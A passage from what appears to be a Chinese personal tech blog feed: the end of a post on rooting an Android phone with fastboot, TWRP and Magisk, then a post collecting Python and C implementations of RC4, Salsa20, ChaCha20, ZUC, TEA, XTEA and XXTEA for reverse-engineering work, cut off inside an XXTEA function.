<li><code>adb reboot bootloader</code>转为FASTBOOT模式（<a href="https://www.hardreset.info/zh/devices/xiaomi/xiaomi-redmi-note-8-pro/faq/drivers/drivers-xiaomi/">windows 缺少驱动在这里下载</a>）</li>
<li><code>fastboot devices</code>看到设备</li>
<li><code>fastboot flash recovery D:\android\BRP3.5.2v3.1-Red-twrp\recovery.img</code>刷入TWRP（[<a href="https://forum.xda-developers.com/t/recovery-unofficial-begonia-recovery-project-themed-twrp-3-5-0-v2-unified-begonia-begoniain.4242717/">RECOVERY][UNOFFICIAL] Begonia Recovery Project Themed TWRP 3.5.0 V2 UNIFIED [begonia&#x2F;begoniain] | XDA Forums (xda-developers.com)</a>）</li>
<li><code>fastboot flash recover</code>启动TWRP（选择系统重启可以回到系统）</li>
</ul>
</li>
<li><p>刷入Magisk（<code>adb push D:\android\Magisk\Magisk.v26.3.zip /sdcard/</code>）</p>
<ul>
<li><p>在手机上根据提示操作，adb上<code>su</code>即可获得root</p>
<h5 id="大功告成！"><a href="#大功告成！" class="headerlink" title="大功告成！"></a>大功告成！</h5><p><img src="/2023/07/11/%E5%AE%89%E5%8D%93%E8%B0%83%E8%AF%95%E5%88%9D%E6%8E%A2/image-20230913202333767.png" alt="image-20230913202333767"></p>
</li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>常见逆向加解密整合</title>
    <url>/2023/11/08/%E5%B8%B8%E8%A7%81%E9%80%86%E5%90%91%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%95%B4%E5%90%88/</url>
    <content><![CDATA[<h6 id="preface：小做一点整理"><a href="#preface：小做一点整理" class="headerlink" title="preface：小做一点整理"></a>preface：小做一点整理</h6><span id="more"></span>

<h2 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h2><h4 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h4><p>魔改的点一般就是在里面加别的操作吧，异或之类的</p>
<pre><code class="python">class RC4:
    def __init__(self, key) -&gt; None:
        self.key = key
        self.S = 0
        self.__rc4_init__()
    def __rc4_init__(self):
        S = [i for i in range(256)]
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        self.S = S
    def rc4_encrypt(self, plain) -&gt; list:
        i = 0
        j = 0
        cipher = []
        for p in plain:
            i = (i + 1) % 256
            j = (j + self.S[i]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]
            k = p ^ self.S[(self.S[i] + self.S[j]) % 256]
            cipher.append(k)
        return cipher

key = []
data = []
rc4 = RC4(key)
plain = rc4.rc4_encrypt(data)
for i in plain:
    print(chr(i),end = &quot;&quot;)
</code></pre>
<h4 id="Salsa20"><a href="#Salsa20" class="headerlink" title="Salsa20"></a>Salsa20</h4><p>需要注意nonce的初始填充</p>
<pre><code class="python">from Crypto.Cipher import Salsa20

key = b&#39;\x07\x05\x0B\x0D\x0F\x0D\x0B\x05\x07\x05\x1B\x1D\x1F\x1D\x1B\x05\x07\x05\x0B\x0D\x0F\x37\x35\x3B\x3D\x3F\x07\x05\x0B\x0D\x0F\x0D&#39;
nonce = b&#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;

plaintext = b&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&quot;
cipher = Salsa20.new(key=key , nonce=nonce)
ciphertext = cipher.encrypt(plaintext)

a = [hex(i) for i in ciphertext]
print(a)
</code></pre>
<p>完整版</p>
<pre><code class="python">
class Salsa:
    def __init__(self, r=20):
        assert r &gt;= 0
        self._r = r  # number of rounds
        self._mask = 0xffffffff  # 32-bit mask

    def __call__(self, key=[0] * 32, nonce=[0] * 8, block_counter=[0] * 8):
        assert len(key) == 32
        assert len(nonce) == 8
        assert len(block_counter) == 8

        # init state
        k = [self._littleendian(key[4 * i:4 * i + 4]) for i in range(8)]
        n = [self._littleendian(nonce[4 * i:4 * i + 4]) for i in range(2)]
        b = [self._littleendian(block_counter[4 * i:4 * i + 4]) for i in range(2)]
        c = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]

        s = [c[0], k[0], k[1], k[2],
             k[3], c[1], n[0], n[1],
             b[0], b[1], c[2], k[4],
             k[5], k[6], k[7], c[3]]

        # the state
        self._s = s[:]

        for i in range(self._r):
            self._round()

        # add initial state to the final one
        self._s = [(self._s[i] + s[i]) &amp; self._mask for i in range(16)]

        return self._s

    def _littleendian(self, b):
        assert len(b) == 4
        return b[0] ^ (b[1] &lt;&lt; 8) ^ (b[2] &lt;&lt; 16) ^ (b[3] &lt;&lt; 24)

    def _round(self):
        # quarterround 1
        self._s[4] ^= self._rotl32((self._s[0] + self._s[12]) &amp; self._mask, 7)
        self._s[8] ^= self._rotl32((self._s[0] + self._s[4]) &amp; self._mask, 9)
        self._s[12] ^= self._rotl32((self._s[4] + self._s[8]) &amp; self._mask, 13)
        self._s[0] ^= self._rotl32((self._s[8] + self._s[12]) &amp; self._mask, 18)

        # quarterround 2
        self._s[9] ^= self._rotl32((self._s[1] + self._s[5]) &amp; self._mask, 7)
        self._s[13] ^= self._rotl32((self._s[5] + self._s[9]) &amp; self._mask, 9)
        self._s[1] ^= self._rotl32((self._s[9] + self._s[13]) &amp; self._mask, 13)
        self._s[5] ^= self._rotl32((self._s[1] + self._s[13]) &amp; self._mask, 18)

        # quarterround 3
        self._s[14] ^= self._rotl32((self._s[6] + self._s[10]) &amp; self._mask, 7)
        self._s[2] ^= self._rotl32((self._s[10] + self._s[14]) &amp; self._mask, 9)
        self._s[6] ^= self._rotl32((self._s[2] + self._s[14]) &amp; self._mask, 13)
        self._s[10] ^= self._rotl32((self._s[2] + self._s[6]) &amp; self._mask, 18)

        # quarterround 4
        self._s[3] ^= self._rotl32((self._s[11] + self._s[15]) &amp; self._mask, 7)
        self._s[7] ^= self._rotl32((self._s[3] + self._s[15]) &amp; self._mask, 9)
        self._s[11] ^= self._rotl32((self._s[3] + self._s[7]) &amp; self._mask, 13)
        self._s[15] ^= self._rotl32((self._s[7] + self._s[11]) &amp; self._mask, 18)

        # transpose
        self._s = [self._s[0], self._s[4], self._s[8], self._s[12],
                   self._s[1], self._s[5], self._s[9], self._s[13],
                   self._s[2], self._s[6], self._s[10], self._s[14],
                   self._s[3], self._s[7], self._s[11], self._s[15]]

    def _rotl32(self, w, r):
        # rotate left for 32-bits
        return (((w &lt;&lt; r) &amp; self._mask) | (w &gt;&gt; (32 - r)))


if __name__ == &#39;__main__&#39;:
    salsa20 = Salsa()

    # vectors = [
    #    [ [0]*32, [3,1,4,1,5,9,2,6], [7,0,0,0,0,0,0,0],     # 这里就是参数!!!
    #    [ 0xb9a205a3,0x0695e150,0xaa94881a,0xadb7b12c,
    #      0x798942d4,0x26107016,0x64edb1a4,0x2d27173f,
    #      0xb1c7f1fa,0x62066edc,0xe035fa23,0xc4496f04,
    #      0x2131e6b3,0x810bde28,0xf62cb407,0x6bdede3d ] ] ]
    vectors = [
        [[0] * 32, [0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0, 0, 0]]]  # 这里就是参数!!!

    for i in range(len(vectors)):
        v = vectors[i]
        print(f&quot;key =&gt; &#123;v[0]&#125;&quot;)
        print(f&quot;nonce =&gt; &#123;v[1]&#125;&quot;)
        print(f&quot;block_counter =&gt; &#123;v[2]&#125;&quot;)
        s = salsa20(v[0], v[1], v[2])
        stream_key = []
        # for i in s:
        #   print(hex(i),end = &quot; &quot;)

        for i in range(len(s)):
            stream_key.append(s[i] &amp; 0xff)
            stream_key.append((s[i] &amp; 0xff00) &gt;&gt; 8)
            stream_key.append((s[i] &amp; 0xff0000) &gt;&gt; 16)
            stream_key.append((s[i] &amp; 0xff000000) &gt;&gt; 24)
        print()
        cybertext = [1,1,1,1]
        for i in range(len(stream_key)):
            print(chr(stream_key[i] ^ cybertext[i]), end=&quot;&quot;)
</code></pre>
<h4 id="chacha20"><a href="#chacha20" class="headerlink" title="chacha20"></a>chacha20</h4><pre><code class="python">
from Crypto.Cipher import ChaCha20
key = b&#39;\x07\x05\x0B\x0D\x0F\x0D\x0B\x05\x07\x05\x1B\x1D\x1F\x1D\x1B\x05\x07\x05\x0B\x0D\x0F\x37\x35\x3B\x3D\x3F\x07\x05\x0B\x0D\x0F\x0D&#39;
plaintext = b&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&quot;
nonce = b&#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;
cipher = ChaCha20.new(key=key,nonce=nonce)
ciphertext = cipher.encrypt(plaintext)

# 获取 nonce（用于解密）
# nonce = cipher.nonce


# 解密
# cipher = ChaCha20.new(key=key, nonce=nonce)
# decrypted_text = cipher.decrypt(ciphertext)

a = [hex(i) for i in ciphertext]
print(a)
</code></pre>
<pre><code class="cpp">#include &lt;stdint.h&gt;
#include &lt;string.h&gt;
#include &lt;bits/stdc++.h&gt;
static inline void u32t8le(uint32_t v, uint8_t p[4]) &#123;
    p[0] = v &amp; 0xff;
    p[1] = (v &gt;&gt; 8) &amp; 0xff;
    p[2] = (v &gt;&gt; 16) &amp; 0xff;
    p[3] = (v &gt;&gt; 24) &amp; 0xff;
&#125;

static inline uint32_t u8t32le(uint8_t p[4]) &#123;
    uint32_t value = p[3];
    
    value = (value &lt;&lt; 8) | p[2];
    value = (value &lt;&lt; 8) | p[1];
    value = (value &lt;&lt; 8) | p[0];
    
    return value;
&#125;

static inline uint32_t rotl32(uint32_t x, int n) &#123;
    // http://blog.regehr.org/archives/1063
    return x &lt;&lt; n | (x &gt;&gt; (-n &amp; 31));
&#125;

// https://tools.ietf.org/html/rfc7539##section-2.1
static void chacha20_quarterround(uint32_t *x, int a, int b, int c, int d) &#123;
    x[a] += x[b]; x[d] = rotl32(x[d] ^ x[a], 16);
    x[c] += x[d]; x[b] = rotl32(x[b] ^ x[c], 12);
    x[a] += x[b]; x[d] = rotl32(x[d] ^ x[a],  8);
    x[c] += x[d]; x[b] = rotl32(x[b] ^ x[c],  7);
&#125;

static void chacha20_serialize(uint32_t in[16], uint8_t output[64]) &#123;
    int i;
    for (i = 0; i &lt; 16; i++) &#123;
        u32t8le(in[i], output + (i &lt;&lt; 2));
    &#125;
&#125;

static void chacha20_block(uint32_t in[16], uint8_t out[64], int num_rounds) &#123; // num_rounds 一般为20 
    int i;
    uint32_t x[16];
    
    memcpy(x, in, sizeof(uint32_t) * 16);
    
    for (i = num_rounds; i &gt; 0; i -= 2) &#123;    
        //odd round
        chacha20_quarterround(x, 0, 4,  8, 12);
        chacha20_quarterround(x, 1, 5,  9, 13);
        chacha20_quarterround(x, 2, 6, 10, 14);
        chacha20_quarterround(x, 3, 7, 11, 15);
        //even round 
        chacha20_quarterround(x, 0, 5, 10, 15);
        chacha20_quarterround(x, 1, 6, 11, 12);
        chacha20_quarterround(x, 2, 7,  8, 13);
        chacha20_quarterround(x, 3, 4,  9, 14);
    &#125;
    
    for (i = 0; i &lt; 16; i++) &#123;
        x[i] += in[i];
    &#125;
    
    chacha20_serialize(x, out);
&#125;

// https://tools.ietf.org/html/rfc7539##section-2.3
static void chacha20_init_state(uint32_t s[16], uint8_t key[32], uint32_t counter, uint8_t nonce[12]) &#123;
    int i;
    
    // refer: https://dxr.mozilla.org/mozilla-beta/source/security/nss/lib/freebl/chacha20.c
    // convert magic number to string: &quot;expand 32-byte k&quot;
    s[0] = 0x61707865;
    s[1] = 0x3320646e;
    s[2] = 0x79622d32;
    s[3] = 0x6b206574;
    
    for (i = 0; i &lt; 8; i++) &#123;
        s[4 + i] = u8t32le(key + i * 4);
    &#125;
    
    s[12] = counter;
    
    for (i = 0; i &lt; 3; i++) &#123;
        s[13 + i] = u8t32le(nonce + i * 4);
    &#125;
&#125;

void ChaCha20XOR(uint8_t key[32], uint32_t counter, uint8_t nonce[12], uint8_t *in, uint8_t *out, int inlen) &#123;
    int i, j;
    
    uint32_t s[16];
    uint8_t block[64];
    
    chacha20_init_state(s, key, counter, nonce);
    
    for (i = 0; i &lt; inlen; i += 64) &#123;
        chacha20_block(s, block, 20);
        s[12]++;
        
        for (j = i; j &lt; i + 64; j++) &#123;
            if (j &gt;= inlen) &#123;
                break;
            &#125;
            out[j] = in[j] ^ block[j - i];
        &#125;
    &#125;
&#125;

int main() &#123;
    int i;
    
    uint8_t key[] = &#123;
        0x00, 0x01, 0x02, 0x03,
        0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b,
        0x0c, 0x0d, 0x0e, 0x0f,
        0x10, 0x11, 0x12, 0x13,
        0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1a, 0x1b,
        0x1c, 0x1d, 0x1e, 0x1f
    &#125;;
    
    uint8_t nonce[] = &#123;                // 随机数 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    &#125;;
    
    uint8_t input[114] = &#123;
        0x4c, 0x61, 0x64, 0x69, 0x65, 0x73, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x47, 0x65, 0x6e, 0x74, 0x6c
    &#125;;
    
    uint8_t encrypt[114];
    uint8_t decrypt[114];
    
    int counter = 1;
    
    ChaCha20XOR(key, counter, nonce, input, encrypt, 114);             
    ChaCha20XOR(key, counter, nonce, encrypt, decrypt, 114);
    
    printf(&quot;\nkey:&quot;);
    for (i = 0; i &lt; 32; i++) &#123;
        if (!(i % 16)) &#123;
            printf(&quot;\n&quot;);
        &#125;
        printf(&quot;%02x &quot;, key[i]);
    &#125;
    
    printf(&quot;\n\nnonce:\n&quot;);
    for (i = 0; i &lt; 12; i++) &#123;
        printf(&quot;%02x &quot;, nonce[i]);
    &#125;
    
    printf(&quot;\n\nplaintext:&quot;);
    for (i = 0; i &lt; 114; i++) &#123;
        if (!(i % 16)) &#123;
            printf(&quot;\n&quot;);
        &#125;
        printf(&quot;%02x &quot;, input[i]);
    &#125;
    
    printf(&quot;\n\nencrypted:&quot;);
    for (i = 0; i &lt; 114; i++) &#123;
        if (!(i % 16)) &#123;
            printf(&quot;\n&quot;);
        &#125;
        printf(&quot;%02x &quot;, encrypt[i]);
    &#125;
    
    printf(&quot;\n\ndecrypted:&quot;);
    for (i = 0; i &lt; 114; i++) &#123;
        if (!(i % 16)) &#123;
            printf(&quot;\n&quot;);
        &#125;
        printf(&quot;%02x &quot;, decrypt[i]);
    &#125;
    
    printf(&quot;\n&quot;);
    return 0;
&#125;
</code></pre>
<h4 id="ZUC"><a href="#ZUC" class="headerlink" title="ZUC"></a>ZUC</h4><p>未测试过，没找到合适的标准库</p>
<pre><code class="python">from math import ceil
 
S0 = [
    0x3E, 0x72, 0x5B, 0x47, 0xCA, 0xE0, 0x00, 0x33, 0x04, 0xD1, 0x54, 0x98, 0x09, 0xB9, 0x6D, 0xCB,
    0x7B, 0x1B, 0xF9, 0x32, 0xAF, 0x9D, 0x6A, 0xA5, 0xB8, 0x2D, 0xFC, 0x1D, 0x08, 0x53, 0x03, 0x90,
    0x4D, 0x4E, 0x84, 0x99, 0xE4, 0xCE, 0xD9, 0x91, 0xDD, 0xB6, 0x85, 0x48, 0x8B, 0x29, 0x6E, 0xAC,
    0xCD, 0xC1, 0xF8, 0x1E, 0x73, 0x43, 0x69, 0xC6, 0xB5, 0xBD, 0xFD, 0x39, 0x63, 0x20, 0xD4, 0x38,
    0x76, 0x7D, 0xB2, 0xA7, 0xCF, 0xED, 0x57, 0xC5, 0xF3, 0x2C, 0xBB, 0x14, 0x21, 0x06, 0x55, 0x9B,
    0xE3, 0xEF, 0x5E, 0x31, 0x4F, 0x7F, 0x5A, 0xA4, 0x0D, 0x82, 0x51, 0x49, 0x5F, 0xBA, 0x58, 0x1C,
    0x4A, 0x16, 0xD5, 0x17, 0xA8, 0x92, 0x24, 0x1F, 0x8C, 0xFF, 0xD8, 0xAE, 0x2E, 0x01, 0xD3, 0xAD,
    0x3B, 0x4B, 0xDA, 0x46, 0xEB, 0xC9, 0xDE, 0x9A, 0x8F, 0x87, 0xD7, 0x3A, 0x80, 0x6F, 0x2F, 0xC8,
    0xB1, 0xB4, 0x37, 0xF7, 0x0A, 0x22, 0x13, 0x28, 0x7C, 0xCC, 0x3C, 0x89, 0xC7, 0xC3, 0x96, 0x56,
    0x07, 0xBF, 0x7E, 0xF0, 0x0B, 0x2B, 0x97, 0x52, 0x35, 0x41, 0x79, 0x61, 0xA6, 0x4C, 0x10, 0xFE,
    0xBC, 0x26, 0x95, 0x88, 0x8A, 0xB0, 0xA3, 0xFB, 0xC0, 0x18, 0x94, 0xF2, 0xE1, 0xE5, 0xE9, 0x5D,
    0xD0, 0xDC, 0x11, 0x66, 0x64, 0x5C, 0xEC, 0x59, 0x42, 0x75, 0x12, 0xF5, 0x74, 0x9C, 0xAA, 0x23,
    0x0E, 0x86, 0xAB, 0xBE, 0x2A, 0x02, 0xE7, 0x67, 0xE6, 0x44, 0xA2, 0x6C, 0xC2, 0x93, 0x9F, 0xF1,
    0xF6, 0xFA, 0x36, 0xD2, 0x50, 0x68, 0x9E, 0x62, 0x71, 0x15, 0x3D, 0xD6, 0x40, 0xC4, 0xE2, 0x0F,
    0x8E, 0x83, 0x77, 0x6B, 0x25, 0x05, 0x3F, 0x0C, 0x30, 0xEA, 0x70, 0xB7, 0xA1, 0xE8, 0xA9, 0x65,
    0x8D, 0x27, 0x1A, 0xDB, 0x81, 0xB3, 0xA0, 0xF4, 0x45, 0x7A, 0x19, 0xDF, 0xEE, 0x78, 0x34, 0x60
]
 
S1 = [
    0x55, 0xC2, 0x63, 0x71, 0x3B, 0xC8, 0x47, 0x86, 0x9F, 0x3C, 0xDA, 0x5B, 0x29, 0xAA, 0xFD, 0x77,
    0x8C, 0xC5, 0x94, 0x0C, 0xA6, 0x1A, 0x13, 0x00, 0xE3, 0xA8, 0x16, 0x72, 0x40, 0xF9, 0xF8, 0x42,
    0x44, 0x26, 0x68, 0x96, 0x81, 0xD9, 0x45, 0x3E, 0x10, 0x76, 0xC6, 0xA7, 0x8B, 0x39, 0x43, 0xE1,
    0x3A, 0xB5, 0x56, 0x2A, 0xC0, 0x6D, 0xB3, 0x05, 0x22, 0x66, 0xBF, 0xDC, 0x0B, 0xFA, 0x62, 0x48,
    0xDD, 0x20, 0x11, 0x06, 0x36, 0xC9, 0xC1, 0xCF, 0xF6, 0x27, 0x52, 0xBB, 0x69, 0xF5, 0xD4, 0x87,
    0x7F, 0x84, 0x4C, 0xD2, 0x9C, 0x57, 0xA4, 0xBC, 0x4F, 0x9A, 0xDF, 0xFE, 0xD6, 0x8D, 0x7A, 0xEB,
    0x2B, 0x53, 0xD8, 0x5C, 0xA1, 0x14, 0x17, 0xFB, 0x23, 0xD5, 0x7D, 0x30, 0x67, 0x73, 0x08, 0x09,
    0xEE, 0xB7, 0x70, 0x3F, 0x61, 0xB2, 0x19, 0x8E, 0x4E, 0xE5, 0x4B, 0x93, 0x8F, 0x5D, 0xDB, 0xA9,
    0xAD, 0xF1, 0xAE, 0x2E, 0xCB, 0x0D, 0xFC, 0xF4, 0x2D, 0x46, 0x6E, 0x1D, 0x97, 0xE8, 0xD1, 0xE9,
    0x4D, 0x37, 0xA5, 0x75, 0x5E, 0x83, 0x9E, 0xAB, 0x82, 0x9D, 0xB9, 0x1C, 0xE0, 0xCD, 0x49, 0x89,
    0x01, 0xB6, 0xBD, 0x58, 0x24, 0xA2, 0x5F, 0x38, 0x78, 0x99, 0x15, 0x90, 0x50, 0xB8, 0x95, 0xE4,
    0xD0, 0x91, 0xC7, 0xCE, 0xED, 0x0F, 0xB4, 0x6F, 0xA0, 0xCC, 0xF0, 0x02, 0x4A, 0x79, 0xC3, 0xDE,
    0xA3, 0xEF, 0xEA, 0x51, 0xE6, 0x6B, 0x18, 0xEC, 0x1B, 0x2C, 0x80, 0xF7, 0x74, 0xE7, 0xFF, 0x21,
    0x5A, 0x6A, 0x54, 0x1E, 0x41, 0x31, 0x92, 0x35, 0xC4, 0x33, 0x07, 0x0A, 0xBA, 0x7E, 0x0E, 0x34,
    0x88, 0xB1, 0x98, 0x7C, 0xF3, 0x3D, 0x60, 0x6C, 0x7B, 0xCA, 0xD3, 0x1F, 0x32, 0x65, 0x04, 0x28,
    0x64, 0xBE, 0x85, 0x9B, 0x2F, 0x59, 0x8A, 0xD7, 0xB0, 0x25, 0xAC, 0xAF, 0x12, 0x03, 0xE2, 0xF2
]
 
D = [
    0x44D7, 0x26BC, 0x626B, 0x135E, 0x5789, 0x35E2, 0x7135, 0x09AF,
    0x4D78, 0x2F13, 0x6BC4, 0x1AF1, 0x5E26, 0x3C4D, 0x789A, 0x47AC
]
 
 
def addition_uint31(a, b):
    c = a + b
    return (c &amp; 0x7FFFFFFF) + (c &gt;&gt; 31)
 
 
def rotl_uint31(a, shift):
    return ((a &lt;&lt; shift) | (a &gt;&gt; (31 - shift))) &amp; 0x7FFFFFFF
 
 
def rotl_uint32(a, shift):
    return ((a &lt;&lt; shift) | (a &gt;&gt; (32 - shift))) &amp; 0xFFFFFFFF
 
 
def l1(x):
    return (x ^ rotl_uint32(x, 2) ^ rotl_uint32(x, 10) ^ rotl_uint32(x, 18) ^ rotl_uint32(x, 24))
 
 
def l2(x):
    return (x ^ rotl_uint32(x, 8) ^ rotl_uint32(x, 14) ^ rotl_uint32(x, 22) ^ rotl_uint32(x, 30))
 
 
def make_uint32(a, b, c, d):
    return ((a &lt;&lt; 24) &amp; 0xffffffff) | ((b &lt;&lt; 16) &amp; 0xffffffff) | ((c &lt;&lt; 8) &amp; 0xffffffff) | d
 
 
def make_uint31(a, b, c):
    return ((a &lt;&lt; 23) &amp; 0x7fffffff) | ((b &lt;&lt; 8) &amp; 0x7fffffff) | c
 
 
class ZUC(object):
    def __init__(self, key, iv):
        self.r = [0, 0]
        self.lfsr = [0 for _ in range(16)]
        self.x = [0, 0, 0, 0]
        self.zuc_init(key, iv)
 
    def bit_reorganization(self):
        self.x[0] = ((self.lfsr[15] &amp; 0x7FFF8000) &lt;&lt; 1) | (self.lfsr[14] &amp; 0xFFFF)
        self.x[1] = ((self.lfsr[11] &amp; 0xFFFF) &lt;&lt; 16) | (self.lfsr[9] &gt;&gt; 15)
        self.x[2] = ((self.lfsr[7] &amp; 0xFFFF) &lt;&lt; 16) | (self.lfsr[5] &gt;&gt; 15)
        self.x[3] = ((self.lfsr[2] &amp; 0xFFFF) &lt;&lt; 16) | (self.lfsr[0] &gt;&gt; 15)
 
    def lfsr_next(self):
        f = self.lfsr[0]
        v = rotl_uint31(self.lfsr[0], 8)
        f = addition_uint31(f, v)
        v = rotl_uint31(self.lfsr[4], 20)
        f = addition_uint31(f, v)
        v = rotl_uint31(self.lfsr[10], 21)
        f = addition_uint31(f, v)
        v = rotl_uint31(self.lfsr[13], 17)
        f = addition_uint31(f, v)
        v = rotl_uint31(self.lfsr[15], 15)
        f = addition_uint31(f, v)
        return f
 
    def lfsr_append(self, f):
        self.lfsr.append(f)
        if len(self.lfsr) &gt; 16:
            self.lfsr.pop(0)
 
    def lfsr_init(self, u):
        self.lfsr_append(addition_uint31(self.lfsr_next(), u))
 
    def lfsr_shift(self):
        self.lfsr_append(self.lfsr_next())
 
    def f(self):
        W = ((self.x[0] ^ self.r[0]) + self.r[1]) &amp; 0xffffffff
        W1 = (self.r[0] + self.x[1]) &amp; 0xffffffff
        W2 = self.r[1] ^ self.x[2]
        u = l1(((W1 &amp; 0x0000ffff) &lt;&lt; 16) | (W2 &gt;&gt; 16))
        v = l2(((W2 &amp; 0x0000ffff) &lt;&lt; 16) | (W1 &gt;&gt; 16))
        self.r = [make_uint32(S0[u &gt;&gt; 24], S1[(u &gt;&gt; 16) &amp; 0xFF],
                              S0[(u &gt;&gt; 8) &amp; 0xFF], S1[u &amp; 0xFF]),
                  make_uint32(S0[v &gt;&gt; 24], S1[(v &gt;&gt; 16) &amp; 0xFF],
                              S0[(v &gt;&gt; 8) &amp; 0xFF], S1[v &amp; 0xFF])]
        return W
 
    def zuc_init(self, key, iv):
        # Expand key.
        self.lfsr = [make_uint31(key[i], D[i], iv[i]) for i in range(16)]
        self.r = [0, 0]
        for i in range(32):
            self.bit_reorganization()
            w = self.f()
            self.lfsr_init(w &gt;&gt; 1)
 
    def zuc_generate_keystream(self, length):
        keystream_buffer = []
        self.bit_reorganization()
        self.f()  # Discard the output of F.
 
        def itor():
            self.lfsr_shift()
            self.bit_reorganization()
            return self.f() ^ self.x[-1]
 
        keystream_buffer = [itor() for _ in range(length)]
        self.lfsr_shift()
        return keystream_buffer
 
    def zuc_encrypt(self, input):
        length = len(input)
        key_stream = self.zuc_generate_keystream(length)
        return [inp ^ key_stream[i] for i, inp in enumerate(input)]
 
 
if &#39;__main__&#39; == __name__:
    key = [0x00] * 16
    iv = [0x00] * 16
    zuc = ZUC(key, iv)
    # 加密过程
    out = zuc.zuc_encrypt(b&quot;i love u&quot;)
    print(&quot;加密得到的字流&quot;, [&quot;%08x&quot; % e for e in out])
    # 解密过程
    zuc2 = ZUC(key, iv)
    out2 = zuc2.zuc_encrypt(out)
    print(&quot;解密得到的字流&quot;, [&quot;%08x&quot; % e for e in out2])
    print(bytes(out2))
</code></pre>
<h2 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h2><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><h4 id="TEA-1"><a href="#TEA-1" class="headerlink" title="TEA"></a>TEA</h4><pre><code class="c">#define uint unsigned int
void encrypt(uint *v, uint *key)
&#123;
    uint l = v[0], r = v[1], sum = 0, delta = 0x9e3779b9;
    for (int i = 1; i &lt;= 32; ++i)
    &#123;
        sum += delta;
        l += ((r &lt;&lt; 4) + key[0]) ^ (r + sum) ^ ((r &gt;&gt; 5) + key[1]);
        r += ((l &lt;&lt; 4) + key[2]) ^ (l + sum) ^ ((l &gt;&gt; 5) + key[3]);
    &#125;
    v[0] = l, v[1] = r;
&#125;
void decrypt(uint *v, uint *key)
&#123;
    uint l = v[0], r = v[1], sum = 0, delta = 0x9e3779b9;
    sum = delta * 32;
    for (int i = 1; i &lt;= 32; ++i)
    &#123;
        r -= ((l &lt;&lt; 4) + key[2]) ^ (l + sum) ^ ((l &gt;&gt; 5) + key[3]);
        l -= ((r &lt;&lt; 4) + key[0]) ^ (r + sum) ^ ((r &gt;&gt; 5) + key[1]);
        sum -= delta;
    &#125;
    v[0] = l, v[1] = r;
&#125;
</code></pre>
<h4 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h4><pre><code class="c">#define uint unsigned int
void encrypt(uint *v, uint *key)
&#123;
    uint l = v[0], r = v[1], sum = 0, delta = 0x9e3779b9;
    for (int i = 1; i &lt;= 32; ++i)
    &#123;
        l += (((r &lt;&lt; 4) ^ (r &gt;&gt; 5)) + r) ^ (sum + key[sum &amp; 3]);
        sum += delta;
        r += (((l &lt;&lt; 4) ^ (l &gt;&gt; 5)) + l) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);
    &#125;
    v[0] = l;
    v[1] = r;
&#125;

void decrypt(uint *v, uint *key)
&#123;
    uint l = v[0], r = v[1], sum = 0, delta = 0x9e3779b9;
    sum = delta * 32;
    for (int i = 1; i &lt;= 32; ++i)
    &#123;
        r -= (((l &lt;&lt; 4) ^ (l &gt;&gt; 5)) + l) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);
        sum -= delta;
        l -= (((r &lt;&lt; 4) ^ (r &gt;&gt; 5)) + r) ^ (sum + key[sum &amp; 3]);
    &#125;
    v[0] = l;
    v[1] = r;
&#125;
</code></pre>
<h4 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h4><pre><code class="c">#include &lt;cstdio&gt;
#define uint unsigned int
#define MX (((z &gt;&gt; 5 ^ y &lt;&lt; 2) + (y &gt;&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (k[(i &amp; 3) ^ e] ^ z)))
void xxtea(uint *v, int n, uint *k)  
&#123;
    uint y, z, sum, i, t, e, delta = 0x9e3779b9;;
    if (n &gt; 1) // encrypt
    &#123;
        t = 6 + 52 / n, sum = 0, z = v[n - 1];
        while (t--)
        &#123;
            sum += delta, e = (sum &gt;&gt; 2) &amp; 3;
            for (i = 0; i &lt; n - 1; ++i)
            &#123;
                y = v[i + 1];
                z = v[i] += MX;
            &#125;
            y = v[0];
            z = v[n - 1] += MX;
        &#125;
    &#125;
    else if (n &lt; -1) // decrypt
    &#123;
        n = -n, t = 6 + 52 / n, sum = t * delta, y = v[0];
        while (t--)
        &#123;
            e = (sum &gt;&gt; 2) &amp; 3;
            for (i = n - 1; i &gt; 0; --i)
            &#123;
                z = v[i - 1];
                y = v[i] -= MX;
            &#125;
            z = v[n - 1];
            y = v[0] -= MX;
            sum -= delta;
        &#125;
    &#125;
&#125;
int main()
&#123;
    uint v[2]= &#123;1,2&#125;, k[4]= &#123;2,2,3,4&#125;;
    int n = 2; // abs(n) = strlen(v)
    printf(&quot;data: %u %u\n&quot;,v[0],v[1]);
    xxtea(v, n, k);
    printf(&quot;encrypt:%u %u\n&quot;,v[0],v[1]);
    xxtea(v, -n, k);
    printf(&quot;decrypt: %u %u\n&quot;,v[0],v[1]);
    return 0;
&#125;
</code></pre>
<pre><code class="python">from ctypes import *


def MX(z, y, total, key, p, e):
    temp1 = (z.value &gt;&gt; 5 ^ y.value &lt;&lt; 2) + (y.value &gt;&gt; 3 ^ z.value &lt;&lt; 4)
    temp2 = (total.value ^ y.value) + (key[(p &amp; 3) ^ e.value] ^ z.value)

    return c_uint32(temp1 ^ temp2)


def encrypt(n, v, key):
    delta = 0x9e3779b9
